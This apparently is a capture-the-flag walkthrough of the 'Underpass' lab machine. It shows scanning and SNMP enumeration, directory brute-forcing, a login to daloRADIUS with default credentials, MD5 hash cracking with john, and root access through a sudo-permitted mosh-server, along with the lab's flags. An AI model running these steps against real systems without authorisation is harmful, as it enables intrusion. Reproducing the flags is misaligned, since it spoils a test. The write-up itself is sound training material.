---
title: "Underpass"
date: 2024-12-27
slug: "underpass"
tags: ["machines", "underpass", "walkthrough"]
cover: "/images/underpass/Pasted image 20241224200105.png"
summary: "Walkthrough of the Underpass Machines machine covering recon, exploitation, and privilege escalation."
---
## 1: Nmap
```shell
nmap 10.10.11.48 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-24 09:45 PST
Nmap scan report for 10.10.11.48
Host is up (1.1s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.53 seconds

```

```shell
sudo nmap -sU 10.10.11.48 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-24 11:25 PST
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Stats: 0:03:39 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 19.11% done; ETC: 11:44 (0:15:27 remaining)
Stats: 0:07:41 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 32.54% done; ETC: 11:49 (0:15:56 remaining)
Stats: 0:07:51 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 32.77% done; ETC: 11:49 (0:16:06 remaining)
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Stats: 0:11:07 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 51.83% done; ETC: 11:47 (0:10:20 remaining)
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Stats: 0:16:11 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 80.41% done; ETC: 11:45 (0:03:56 remaining)
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (2.1s latency).
Not shown: 995 closed udp ports (port-unreach)
PORT     STATE         SERVICE
161/udp  open          snmp
1100/udp open|filtered mctp
1812/udp open|filtered radius
1813/udp open|filtered radacct
6050/udp open|filtered x11

Nmap done: 1 IP address (1 host up) scanned in 1229.30 seconds

```
## 2: Inspecting Web

Default apache web page, checked page source and found this:
![underpass-1](/images/underpass/Pasted image 20241224200105.png)

apache version:
![underpass-2](/images/underpass/Pasted image 20241224203811.png)


I will check the vulnerabilities of this version

https://www.cvedetails.com/version/699448/Apache-Http-Server-2.4.53.html
https://www.cvedetails.com/cve/CVE-2024-38476/

found this exploit:
https://github.com/mrmtwoj/apache-vulnerability-testing

will try it out
![underpass-3](/images/underpass/Pasted image 20241224203828.png)

nothing happened. So I will try directory bruteforce with /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt
didn't find anything
 I will try snmp

## 3: Investigating SNMP

I will use this guide from hacktricks: https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp

```shell
snmpbulkwalk -c public -v2c 10.10.11.48 .       
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (462337) 1:17:03.37
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (463406) 1:17:14.06
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E8 0C 1A 12 1F 29 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 215
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

what i will do is try daloradius as a subdomain or a directory in the web

## 4: Back to Web

![underpass-4](/images/underpass/Pasted image 20241226203553.png)

interesting

time to perform subdirectory bruteforce

```shell
 gobuster dir -u http://underpass.htb/daloradius -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://underpass.htb/daloradius
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/app                  (Status: 301) [Size: 323] [--> http://underpass.htb/daloradius/app/]
/ChangeLog            (Status: 200) [Size: 24703]
/contrib              (Status: 301) [Size: 327] [--> http://underpass.htb/daloradius/contrib/]
/doc                  (Status: 301) [Size: 323] [--> http://underpass.htb/daloradius/doc/]
/library              (Status: 301) [Size: 327] [--> http://underpass.htb/daloradius/library/]
/LICENSE              (Status: 200) [Size: 18011]
/setup                (Status: 301) [Size: 325] [--> http://underpass.htb/daloradius/setup/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

forbidden access to /daloradius/app, I will try on it further and see from there

```shell
gobuster dir -u http://underpass.htb/daloradius/app -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://underpass.htb/daloradius/app
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/common               (Status: 301) [Size: 330] [--> http://underpass.htb/daloradius/app/common/]
/users                (Status: 301) [Size: 329] [--> http://underpass.htb/daloradius/app/users/]
/operators            (Status: 301) [Size: 333] [--> http://underpass.htb/daloradius/app/operators/]
Progress: 4616 / 4617 (99.98%)
===============================================================
Finished
===============================================================

```

upon going for /daloradius/app/users/, we got redirected to:

![underpass-5](/images/underpass/Pasted image 20241226204151.png)

let's check more about daloradius...

daloradius is an advanced RADIUS web platform aimed at managing Hotspots and general-purpose ISP deployments.

upon logging in with administrator:radius we got this:

![underpass-6](/images/underpass/Pasted image 20241226204410.png)

internal server error in the network, weird....
but then I  found /daloradius/app and then after subdirectory bruteforce, found /daloradius/app/operators, then found /daloradius/app/operators/login.php

then tried the same credentials:
![underpass-7](/images/underpass/Pasted image 20241226210254.png)

![underpass-8](/images/underpass/Pasted image 20241226210306.png)
found user svcMosh with hashed password: 412DD4759978ACFCC81DEAB01B382403

let's crack it

## 5: Obtaining User Flag

I found the hash algorithm to be md5

```shell
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=3
Press 'q' or Ctrl-C to abort, almost any other key for status
underwaterfriends (?)     
1g 0:00:00:00 DONE (2024-12-26 21:08) 6.250g/s 18650Kp/s 18650Kc/s 18650KC/s undiamecaiQ..underpants2
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

```
cracked the hash to find the password: underwaterfriends

time to ssh to svcMosh with password: underwaterfriends

```shell
svcMosh@underpass:~$ ls
user.txt
svcMosh@underpass:~$ cat user.txt
3673b9650d35a42a21c3c2993f44eadc
svcMosh@underpass:~$ 


```

## 6: Obtaining Root Flag

```shell
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
svcMosh@underpass:~$ man mosh-server
svcMosh@underpass:~$ 

```
I read about mosh server, mosh: (mobile shell) is a remote terminal application that supports intermittent connectivity, allows roaming, and provides speculative local echo and line editing of user keystrokes.

 mosh  uses  ssh  to  establish  a  connection to the remote host and authenticate with existing means 
```shell
sudo mosh-server new -i 10.10.11.48 -p 60125


MOSH CONNECT 60125 Ygh/1QsKkFeA0sXbE8tSYQ

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 2380]

```

from kali

run `MOSH_KEY=B56I0MCl9PjFvmp+4T0Pxw mosh-client 10.10.11.48 60128` and we obtain:

```shell
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Dec 26 07:32:48 PM UTC 2024

  System load:  0.0               Processes:             235
  Usage of /:   86.6% of 3.75GB   Users logged in:       1
  Memory usage: 11%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%

  => / is using 86.6% of 3.75GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



root@underpass:~# whoami
root
root@underpass:~# ls
root.txt
root@underpass:~# cat root.txt
0d6fb6381095f4a58da233cbf3a3e0b3
root@underpass:~# 

```
